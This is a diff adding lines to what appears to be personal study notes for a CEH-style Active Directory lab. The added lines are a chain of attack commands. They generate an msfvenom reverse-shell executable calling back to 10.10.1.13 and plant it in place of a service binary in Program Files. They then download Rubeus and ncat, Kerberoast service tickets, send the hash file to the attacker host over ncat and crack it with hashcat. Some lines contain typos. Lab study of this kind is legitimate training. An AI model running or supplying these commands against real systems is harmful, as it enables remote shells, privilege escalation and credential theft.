@@ -351,9 +351,22 @@ set DATABASE master
 python3 -m http.serve
 wget http://10.10.1.13:8000/winPEASx64.exe -o winpeas.exe.
 ./winpeas.exe
+msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=8888 -f exe > /root/ADtools/file.exe
+cd ../../.. ; cd "Program Files/CEH Services"
+move file.exe file.bak ; wget http://10.10.1.13:8000/file.exe -o file.exe
+nvlp 8888
+whoami 
 
 ```
+##  Perform Kerberoasting Attack
 
+cd ../.. ; cd Users\Public\Downloads.
+wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
+cd ../.. && cd Users\Public\Downloads 
+rubeus.exe kerberoast /outfile:hash.txt.
+nc -lvp 9999 > hash.txt 
+ncat.exe -w 3 10.10.1.13 9999 < hash.txt
+hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt.
 
 ```
 
